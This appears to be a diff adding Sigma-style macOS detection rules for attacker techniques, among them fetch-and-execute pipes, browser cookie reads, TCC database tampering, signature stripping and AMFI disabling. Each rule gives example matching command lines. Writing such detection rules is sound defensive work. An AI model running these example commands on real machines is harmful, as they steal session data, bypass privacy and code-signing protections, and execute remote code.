@@ -1,0 +1,270 @@
+title: AppleScript Privilege Escalation Via Embedded Shell Command
+id: 30927705-dafa-412a-852e-631c17a1a124
+status: stable
+description: Detects osascript being used to run "do shell script ... with administrator privileges", which pops the standard macOS admin-authorization prompt and then executes arbitrary shell content under elevated rights — a common installer and social-engineering pattern for LOLBin privilege escalation.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.privilege-escalation
+    - attack.t1548
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection:
+        Image|endswith: '/osascript'
+        CommandLine|contains: 'do shell script'
+    selection_admin:
+        CommandLine|contains: 'with administrator privileges'
+    condition: selection and selection_admin
+falsepositives:
+    - Legitimate installers that request administrator rights for a real installation step.
+level: critical
+x-example-match:
+    - osascript -e 'do shell script "id" with administrator privileges'
+x-example-safe:
+    - osascript -e 'return 1'
+    - osascript -e 'do shell script "whoami"'
+---
+title: Pipe-to-Interpreter Fetch and Execute
+id: 16974fb8-3e3c-4775-a5ff-7076cf4e997e
+status: stable
+description: Detects a downloader (curl, wget, or nscurl) piped directly into a shell or scripting interpreter — fetch-and-execute with no file ever hitting disk, so there's nothing for a file-based scanner to catch.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.execution
+    - attack.t1059
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection_downloader:
+        CommandLine|re: '(curl|wget|nscurl)\s'
+    selection_pipe:
+        CommandLine|re: '\|\s*(sh|bash|zsh|python3?|osascript)\b'
+    condition: all of selection_*
+falsepositives:
+    - Developer tooling and setup scripts that intentionally pipe an installer script into a shell.
+level: critical
+x-example-match:
+    - curl -sSL https://get.example.com/install.sh | bash
+    - wget -qO- https://example.com/setup.sh | sh
+x-example-safe:
+    - curl -s https://api.github.com/repos/anthropics/claude-code
+    - curl -o installer.sh https://example.com/install.sh
+---
+title: Direct TCC Database Access or Reset
+id: 67c38ba9-4d7f-4f28-8983-2a5855c20d8b
+status: stable
+description: Detects direct read/write access to TCC.db (the database backing macOS privacy permission prompts for camera, microphone, screen recording, etc.) or a tccutil reset, both of which are used to silently grant or wipe app permissions outside the normal consent UI.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.privilege-escalation
+    - attack.t1548.006
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection_db:
+        CommandLine|contains: 'TCC.db'
+    selection_reset:
+        CommandLine|contains: 'tccutil reset'
+    condition: 1 of selection_*
+falsepositives:
+    - MDM or endpoint-management tooling with a legitimate, documented need to pre-approve permissions.
+level: critical
+x-example-match:
+    - sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db "select * from access"
+    - tccutil reset All
+x-example-safe:
+    - sqlite3 ~/notes.db "select * from entries"
+---
+title: Browser Cookie or Session Store Accessed Outside Browser
+id: dc256e6a-0c1c-4fae-a491-ec365ab1ddb2
+status: stable
+description: Detects a non-browser process (sqlite3, cat, cp) directly reading a browser's Cookies or Login Data store — the file-level equivalent of session-token or saved-password theft, bypassing the browser's own access controls.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.credential-access
+    - attack.t1539
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection_tool:
+        Image|endswith:
+            - '/sqlite3'
+            - '/cat'
+            - '/cp'
+    selection_target:
+        CommandLine|re: '(cookies\.sqlite|/cookies\b|login data)'
+    condition: all of selection_*
+falsepositives:
+    - Browser sync/backup utilities the user has installed intentionally.
+level: critical
+x-example-match:
+    - sqlite3 ~/Library/Application Support/Google/Chrome/Default/Cookies "select * from cookies"
+x-example-safe:
+    - sqlite3 ~/Library/Application Support/MyApp/data.db "select * from settings"
+---
+title: Password Piped Directly Into Sudo
+id: 4b9330f2-1143-468f-9b7c-1b70fbfc4de9
+status: stable
+description: Detects a value being piped straight into "sudo -S" rather than typed interactively at a prompt — the shape of a script or a remote operator supplying a stolen or hardcoded credential non-interactively.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.privilege-escalation
+    - attack.t1548.003
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection:
+        CommandLine|contains: '| sudo -S'
+    condition: selection
+falsepositives:
+    - Configuration-management tooling (Ansible, etc.) that intentionally scripts sudo this way.
+level: high
+x-example-match:
+    - echo mypassword | sudo -S whoami
+x-example-safe:
+    - sudo whoami
+---
+title: Unsigned Configuration Profile Installation
+id: 04af8270-e2a4-4343-be1e-2c42718c169c
+status: stable
+description: Detects the "profiles" CLI installing a configuration profile. Configuration profiles can silently add trusted certificate roots, change DNS/proxy settings, or enroll the device into MDM — installing one outside a deliberate, known enrollment flow is a strong persistence/tampering signal.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.persistence
+    - attack.defense-evasion
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection:
+        Image|endswith: '/profiles'
+        CommandLine|contains:
+            - 'install'
+            - '-i '
+    condition: selection
+falsepositives:
+    - IT-managed enrollment of a new Mac into the organization's real MDM.
+level: high
+x-example-match:
+    - profiles install -type=configuration -path=/tmp/x.mobileconfig
+x-example-safe:
+    - profiles show -type=enrollment
+---
+title: Curl Download Target Expressed As Raw IP
+id: a29f59a7-6af8-448d-9e87-62b8fcd2256a
+status: stable
+description: Detects curl fetching from a bare IP:port rather than a hostname. Mild in isolation — plenty of legitimate internal tooling does this — but a real, well-documented C2 tell when combined with other signals, since malware staging infrastructure rarely bothers with DNS.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.command-and-control
+    - attack.t1071
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection:
+        Image|endswith: '/curl'
+        CommandLine|re: 'https?://\d{1,3}(\.\d{1,3}){3}(:\d+)?'
+    condition: selection
+falsepositives:
+    - Internal tooling and homelab scripts that legitimately address hosts by IP.
+level: low
+x-example-match:
+    - curl -s http://45.33.32.156:8080/payload
+x-example-safe:
+    - curl -s https://api.github.com/repos/anthropics/claude-code
+---
+title: Ad-hoc Code Signature Removed From Binary
+id: efea6c5d-d58a-4afb-b02a-0d9426bacf6f
+status: stable
+description: Detects codesign stripping a binary's existing signature, typically paired with re-signing ad-hoc to dodge Gatekeeper's notarization check on a downloaded or repackaged app.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.defense-evasion
+    - attack.t1553.001
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection:
+        Image|endswith: '/codesign'
+        CommandLine|contains:
+            - '--remove-signature'
+            - '-s -'
+    condition: selection
+falsepositives:
+    - Developers ad-hoc signing their own locally-built binaries during development.
+level: medium
+x-example-match:
+    - codesign --remove-signature /Applications/Foo.app
+    - codesign -f -s - /Applications/Foo.app
+x-example-safe:
+    - codesign -dv /Applications/Foo.app
+---
+title: Hidden LaunchAgent Written To Non-Standard Path
+id: e8485b4f-841b-4d3b-9fea-97337a2dee80
+status: stable
+description: Detects a plist being copied or moved into a hidden (dot-prefixed) directory that itself contains a LaunchAgents-style path segment — persistence artifacts deliberately hidden from a casual Finder/ls look at ~/Library/LaunchAgents.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.persistence
+    - attack.t1564.001
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection_tool:
+        Image|endswith:
+            - '/cp'
+            - '/mv'
+            - '/cat'
+    selection_target:
+        CommandLine|re: '\.plist.*/\.[^/]+/launchagents'
+    condition: all of selection_*
+falsepositives:
+    - Unknown
+level: medium
+x-example-match:
+    - cp helper.plist /Users/mark/Library/.hidden/LaunchAgents/com.foo.helper.plist
+x-example-safe:
+    - cp helper.plist /Users/mark/Library/LaunchAgents/com.foo.helper.plist
+---
+title: AMFI or Kernel Code-Signing Enforcement Disabled Via NVRAM
+id: 30fc38e8-18d7-46ef-9d2a-07a44cb352e6
+status: stable
+description: Detects nvram boot-args being set to disable AMFI (Apple Mobile File Integrity), the subsystem that enforces code-signing at the kernel level — a serious defense-impairment step normally reserved for development Macs, not something legitimate software toggles at runtime.
+author: Argus
+date: 2026-08-21
+tags:
+    - attack.defense-evasion
+    - attack.t1562.001
+logsource:
+    category: process_creation
+    product: macos
+detection:
+    selection:
+        CommandLine|contains: 'nvram boot-args'
+    selection_amfi:
+        CommandLine|contains: 'amfi_get_out_of_my_way'
+    condition: selection and selection_amfi
+falsepositives:
+    - A developer deliberately disabling AMFI on their own development/test Mac.
+level: critical
+x-example-match:
+    - nvram boot-args=amfi_get_out_of_my_way=0x1
+x-example-safe:
+    - nvram -p
